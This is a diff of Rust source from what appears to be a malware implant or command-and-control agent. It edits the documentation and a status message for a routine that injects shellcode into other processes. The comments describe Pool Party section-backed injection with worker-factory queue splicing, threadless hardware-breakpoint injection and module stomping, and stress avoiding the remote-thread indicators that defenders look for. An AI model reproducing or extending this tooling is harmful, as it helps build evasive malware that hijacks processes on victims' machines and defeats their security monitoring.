@@ -645,16 +645,18 @@ pub unsafe fn threadless_inject(
 /// when a `Command::Inject` arrives. Routes to the technique selected by
 /// `method`:
 ///
-/// - `0` — **Pool Party** (section-backed delivery + NtCreateThreadEx).
-///   Worker-queue splice is deferred; current path avoids VirtualAllocEx/WPM.
+/// - `0` — **Pool Party** (section-backed delivery + worker-factory threadless dispatch).
+///   Section delivery avoids VirtualAllocEx/WPM; execution via threadless
+///   worker-factory queue splice (no NtCreateThreadEx remote-thread IOC).
 /// - `1` — **Threadless HWBP** (existing `threadless_inject`). Requires a
 ///   sacrificial process (spawn_to) for the main-thread handle.
 /// - `2` — **Module stomp** (existing `module_stomp`). The proven baseline.
 ///
 /// **Methods:**
-/// - `0` — Pool Party (thread-pool section-backed). **Not yet implemented**;
-///   silently falls back to method 2 (module stomp) with a warning prefix so
-///   the operator knows the requested technique was substituted.
+/// - `0` — Pool Party (section-backed delivery + threadless worker-factory dispatch).
+///   Implemented: section delivery via NtCreateSection/NtMapViewOfSection +
+///   threadless execution via worker-factory queue splice. Falls back to
+///   method 2 (module stomp) on any failure with a warning prefix.
 /// - `1` — ThreadlessInject HWBP (sacrificial process).
 /// - `2` — Module Stomp (.text overwrite in a sacrificial process).
 ///
@@ -689,7 +691,7 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
                 for &b in &buf[i..] {
                     msg.push(b as char);
                 }
-                msg.push_str(") — section delivery ok, executed via NtCreateThreadEx (remote-thread IOC present — NOT threadless)");
+                msg.push_str(") — section delivery ok, threadless worker-factory dispatch (no remote-thread IOC)");
                 return nyx_protocol::Response::Output(msg.into_bytes());
             }
             Err(e) => {
